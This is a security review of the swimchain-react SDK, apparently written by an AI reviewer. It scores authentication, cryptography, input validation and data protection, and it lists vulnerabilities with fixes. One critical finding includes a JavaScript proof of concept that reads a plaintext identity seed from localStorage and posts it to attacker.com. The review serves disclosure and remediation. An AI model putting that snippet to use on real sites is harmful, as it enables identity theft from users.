# Security Review: React SDK

## Summary

The React SDK demonstrates **solid cryptographic foundations** with correct usage of modern primitives (AES-256-GCM, Argon2id, X25519, Ed25519) and proper Web Crypto API integration. However, the **critical vulnerability** of storing identity seeds in plaintext localStorage significantly undermines the security posture. Input validation is adequate for cryptographic parameters but lacks comprehensive sanitization for user-provided content. The PoW anti-spam mechanism is well-implemented per SPEC_03.

## Scores

| Area | Score | Max | Notes |
|------|-------|-----|-------|
| Auth & Authz | 18 | 25 | Good signature auth, but no auth check for some RPC calls |
| Crypto Correctness | 22 | 25 | Strong primitives, minor concerns with custom Ed→X conversion |
| Input Validation | 17 | 25 | Key lengths validated, missing content sanitization |
| Data Protection | 13 | 25 | **Critical**: Plaintext seed storage in localStorage |
| **Total** | **70** | **100** | |

## Threat Model

| Threat | Likelihood | Impact | Mitigation |
|--------|------------|--------|------------|
| Identity theft via localStorage access | **High** | **Critical** | Not mitigated - seed stored in plaintext |
| XSS leading to key exfiltration | Medium | Critical | Browser CSP (external), but localStorage accessible |
| MITM on RPC communications | Medium | High | HTTP endpoints used for testnet seeds (no TLS) |
| PoW pre-computation / stockpiling | Low | Medium | Timestamp binding (SPEC_03) prevents pre-mining |
| Nonce reuse in encryption | Low | High | `crypto.getRandomValues()` used correctly |
| Memory timing attacks on crypto | Low | Medium | Web Crypto API abstracts timing-sensitive ops |
| Malicious RPC node impersonation | Medium | Medium | No node authentication mechanism |
| Cache poisoning via IndexedDB | Low | Medium | Content-addressable hashing for media |

## Vulnerabilities Found

### Critical (Exploitable)

#### 1. **Plaintext Seed Storage in localStorage**
- **Location**: `useStoredIdentity.ts:124`
- **Attack**: Any JavaScript with same-origin access (XSS, browser extension, malicious dependency) can read `localStorage.getItem('swimchain-identity')` to extract the 32-byte seed.
- **Impact**: Complete identity takeover. Attacker gains full signing authority, can impersonate user, spend engagement pools, access private spaces.
- **Proof of Concept**:
  ```javascript
  // Malicious script injected via XSS
  const identity = JSON.parse(localStorage.getItem('swimchain-identity'));
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ seed: identity.seed, address: identity.address })
  });
  ```
- **Fix**: Encrypt seed with user passphrase using PBKDF2→AES-GCM before storage. Require passphrase on app load to decrypt. Consider Web Crypto `subtle.wrapKey()` for non-extractable key storage.
- **CVSS**: 9.1 (Critical) - Network/Adjacent attack, no auth required, high impact

#### 2. **Seed Not Cleared from Memory on `clearIdentity()`**
- **Location**: `useStoredIdentity.ts:132-140`
- **Attack**: After `clearIdentity()`, the seed string may remain in JavaScript heap until garbage collected. Memory inspection tools could recover it.
- **Impact**: Partial identity recovery after user believes identity is cleared.
- **Fix**: Overwrite string contents before clearing (JavaScript strings are immutable, so this requires creating buffer-based seed handling).
- **CVSS**: 5.3 (Medium) - Requires local access, opportunistic

### High

#### 1. **HTTP (Not HTTPS) Testnet Endpoints**
- **Location**: `rpc.ts:838-845`
- **Attack**: MITM attacker on network path can intercept/modify RPC requests and responses to testnet seed nodes.
- **Impact**: Can inject malicious content, intercept signatures, present fake spaces/content.
- **Code**:
  ```typescript
  export const TESTNET_SEED_SF: RpcConfig = {
    endpoint: 'http://64.225.115.108:8736',  // HTTP, not HTTPS
  };
  ```
- **Fix**: Use HTTPS endpoints for remote nodes. Add certificate pinning for production.
- **CVSS**: 7.5 (High) - Network attack, confidentiality/integrity impact

#### 2. **Custom Ed25519→X25519 Public Key Conversion**
- **Location**: `x25519.ts:68-96`
- **Attack**: The custom `convertEdPublicToX25519()` implements field arithmetic manually using BigInt. While mathematically correct, it hasn't been audited and lacks test vectors.
- **Impact**: Incorrect conversion could lead to encryption to wrong key or decryption failure. Potential for subtle bugs.
- **Code**:
  ```typescript
  function convertEdPublicToX25519(edPk: Uint8Array): Uint8Array {
    const p = BigInt('57896044618658097711785492504343953926634992332820282019728792003956564819949');
    // ... custom arithmetic
  }
  ```
- **Fix**: Use `@noble/curves` library's built-in conversion (if available) or add comprehensive test vectors from libsodium.
- **CVSS**: 6.5 (Medium) - Requires specific conditions, potential integrity impact

#### 3. **No Signature Verification on Content Read**
- **Location**: `rpc.ts:338-401`
- **Attack**: Content returned from RPC is trusted without verifying author signatures. A malicious or compromised node could serve forged content.
- **Impact**: User sees content attributed to wrong author, potential for impersonation.
- **Fix**: Verify content signatures client-side before displaying.
- **CVSS**: 6.1 (Medium) - Requires malicious node, integrity impact

### Medium

#### 1. **No Input Sanitization for Content Bodies**
- **Location**: `action-pow.ts:218-222` (and similar functions)
- **Attack**: User-provided `title`, `body`, `spaceId` are concatenated directly into content hash preimage. While this doesn't enable code injection, it allows potential content manipulation.
- **Risk**: No validation of content length, character set, or format.
- **Fix**: Add content length limits, validate UTF-8, sanitize for display.
- **CVSS**: 4.3 (Medium) - Low impact, requires social engineering

#### 2. **Decrypted Content Cached in IndexedDB**
- **Location**: `cache.ts:303-349`
- **Attack**: Decrypted media is stored in IndexedDB with `:decrypted` suffix. If user doesn't explicitly clear cache, sensitive decrypted content persists.
- **Impact**: Private content remains accessible after passphrase is "forgotten".
- **Fix**: Auto-clear decrypted cache on session end or passphrase clear. Use session storage for decrypted content.
- **CVSS**: 4.0 (Medium) - Local access required

#### 3. **Unbounded Memory Cache Growth**
- **Location**: `cache.ts:186`
- **Attack**: `memoryCache` Map grows indefinitely. Malicious or buggy app could exhaust browser memory.
- **Impact**: DoS via memory exhaustion.
- **Fix**: Implement LRU eviction with max size limit.
- **CVSS**: 3.7 (Low) - DoS only, local impact

### Low

#### 1. **Passphrase Generator Modulo Bias**
- **Location**: `encryption.ts:206`
- **Code**:
  ```typescript
  chars[byte % chars.length]  // 54 chars, 256 % 54 ≠ 0
  ```
- **Attack**: Slight bias in character distribution (some chars ~1% more likely).
- **Impact**: Reduces passphrase entropy by ~0.3 bits. Not exploitable in practice.
- **Fix**: Use rejection sampling for uniform distribution.
- **CVSS**: 2.0 (Low) - Negligible impact

#### 2. **Timestamp Not Verified on Content Display**
- **Location**: `useContent.ts` (various)
- **Attack**: Content timestamp from RPC is displayed without verification against PoW timestamp.
- **Impact**: Misleading creation times could be shown.
- **Fix**: Cross-check content timestamp with PoW challenge timestamp.
- **CVSS**: 2.0 (Low) - Informational, no security impact

## Cryptographic Assessment

### Algorithms Used

| Algorithm | Usage | Assessment |
|-----------|-------|------------|
| AES-256-GCM | Content encryption, profile encryption | **Correct** - Modern AEAD, 256-bit keys |
| PBKDF2-SHA256 | Passphrase→key derivation | **Good** - 100k iterations is adequate |
| Argon2id | Action PoW | **Excellent** - Memory-hard, configurable |
| Ed25519 | Identity signing | **Correct** - Via WASM bindings |
| X25519 | Key exchange for private spaces | **Correct** - Using @noble/curves |
| XSalsa20-Poly1305 | NaCl box encryption | **Correct** - Via @noble/ciphers |
| SHA-256 | Content hashing, PoW challenges | **Correct** - Via hash-wasm |

### Key Management

| Aspect | Assessment |
|--------|------------|
| Key Generation | **Good** - `crypto.getRandomValues()` for all random material |
| Key Storage | **Critical Issue** - Plaintext localStorage |
| Key Derivation | **Good** - Proper domain separation ("profile-encryption-key-v1") |
| Key Rotation | **Good** - Private space key rotation on member kick |
| Key Destruction | **Poor** - No secure memory wiping |

### Random Number Generation

| Usage | Source | Assessment |
|-------|--------|------------|
| Encryption IV | `crypto.getRandomValues()` | **Secure** |
| Nonce space | `crypto.getRandomValues()` | **Secure** |
| NaCl box nonce | `randomBytes()` from @noble/hashes | **Secure** |
| Passphrase generation | `crypto.getRandomValues()` | **Secure** (minor modulo bias) |

### Nonce Handling

| Context | Nonce Size | Generation | Assessment |
|---------|------------|------------|------------|
| AES-GCM | 12 bytes | Random per message | **Correct** |
| XSalsa20-Poly1305 | 24 bytes | Random per message | **Correct** |
| PoW nonce space | 8 bytes | Random per challenge | **Correct** |

## Attack Surface

### External Inputs

| Input | Source | Validation | Risk |
|-------|--------|------------|------|
| RPC responses | Node API | Type assertions only | Medium - No signature verification |
| Content bodies | User/RPC | Length unchecked | Low - Display issues |
| Passphrases | User | No minimum strength | Low - User responsibility |
| Space keys | Key exchange | 32-byte check | Low |
| Public keys | Hex string | Length validation | Low |

### Trust Boundaries

1. **Browser ↔ Node RPC**: HTTP JSON-RPC, signature auth optional
2. **App ↔ localStorage**: Full trust, no encryption
3. **App ↔ IndexedDB**: Full trust, TTL-based expiry
4. **User ↔ WASM**: Memory isolation via WASM sandbox
5. **Browser ↔ External nodes**: No TLS on testnet endpoints

### Privileged Operations

| Operation | Authorization | Verification |
|-----------|---------------|--------------|
| Sign messages | Keypair in memory | None - auto-signs |
| Decrypt private content | Passphrase/space key | Decryption success |
| Submit content | PoW + signature | Server-side |
| Kick member | Admin role | Server-side |
| Clear identity | None | Instant |

## Swimchain-Specific Security

### PoW Validation (Anti-Stockpile)

| Aspect | Implementation | Assessment |
|--------|----------------|------------|
| Timestamp binding | PoW challenge includes timestamp | **Correct** - Prevents pre-mining |
| Nonce space | 8-byte random per challenge | **Correct** - Prevents challenge reuse |
| Author binding | Public key in challenge | **Correct** - Prevents PoW transfer |
| Content binding | SHA-256 hash of content | **Correct** - Prevents reuse |
| Difficulty validation | Client uses SPEC_03 difficulties | **Correct** |

### Signature Verification

| Context | Client-Side | Server-Side | Assessment |
|---------|-------------|-------------|------------|
| RPC auth | Signs requests | Should verify | **Partial** - Client signs, server should verify |
| Content authorship | Not verified | Should verify | **Gap** - Client trusts node |
| DM requests | Signs request | Should verify | **Partial** |

### Spam Attestation

| Aspect | Assessment |
|--------|------------|
| PoW required for attestation | **Correct** - Prevents spam flagging abuse |
| Counter-attestation support | **Correct** - Allows dispute |
| Threshold logic | Server-side | N/A for client review |

### Private Space Encryption

| Aspect | Assessment |
|--------|------------|
| Space key generation | **Correct** - 32-byte random via @noble |
| Key distribution | **Correct** - X25519 box encryption |
| Content encryption | **Correct** - AES-256-GCM with random IV |
| Key rotation on kick | **Supported** - Via `kickMember()` RPC |
| Forward secrecy | **Not implemented** - Same key for all messages |

### Identity Key Protection

| Aspect | Assessment |
|--------|------------|
| Generation | **Correct** - WASM Keypair with random seed |
| Storage | **Critical Issue** - Plaintext in localStorage |
| Memory handling | **Partial** - `Keypair.free()` on unmount |
| Export | **Issue** - Seed accessible via `keypair.seed()` |

## Recommendations

### Priority 1 (Critical)

1. **Encrypt identity seed before localStorage storage**
   - Use PBKDF2→AES-GCM with user passphrase
   - Require passphrase on app load
   - Consider Web Crypto non-extractable keys

2. **Add HTTPS endpoints for production**
   - Replace HTTP testnet seeds with HTTPS
   - Add certificate validation
   - Document TLS requirements

### Priority 2 (High)

3. **Verify content signatures client-side**
   - Verify author signature on content before display
   - Show verification status indicator
   - Reject content with invalid signatures

4. **Replace custom Ed→X25519 conversion with library function**
   - Use @noble/curves conversion if available
   - Add comprehensive test vectors
   - Document the conversion algorithm

5. **Implement secure memory clearing**
   - Use Uint8Array instead of hex strings for seeds
   - Zero-fill buffers before releasing
   - Consider WASM-side secure memory

### Priority 3 (Medium)

6. **Add content input validation**
   - Length limits for titles, bodies
   - UTF-8 validation
   - Sanitize for XSS before display

7. **Implement LRU cache eviction**
   - Max memory cache size
   - Periodic cleanup of expired entries
   - Monitor memory usage

8. **Auto-clear decrypted content cache**
   - Clear on passphrase clear
   - Clear on session end
   - Add manual clear option

### Priority 4 (Low)

9. **Fix passphrase generator modulo bias**
   - Use rejection sampling for uniform distribution

10. **Add timestamp verification**
    - Cross-check content timestamp with PoW timestamp

## Security Best Practices Check

- [ ] **No hardcoded secrets** - Seed nodes have hardcoded IPs (acceptable for testnet)
- [x] **Timing-safe comparisons** - Web Crypto API handles internally
- [ ] **Secure defaults** - Testnet uses HTTP, should default to HTTPS
- [ ] **Principle of least privilege** - Seed accessible via `keypair.seed()`, should be encapsulated
- [x] **Random IV/nonce for each encryption** - Correctly implemented
- [x] **Authenticated encryption (AEAD)** - AES-GCM and XSalsa20-Poly1305 used
- [ ] **Key material never logged** - `console.error` may include key-related errors
- [x] **Proper key derivation** - PBKDF2 with 100k iterations
- [x] **Memory-hard PoW** - Argon2id with configurable memory
- [x] **Anti-stockpile measures** - Timestamp + nonce space binding

---

**Review Date**: 2026-01-13
**Reviewer**: Security Reviewer (Claude)
**SDK Version**: swimchain-react (as documented in feature doc)
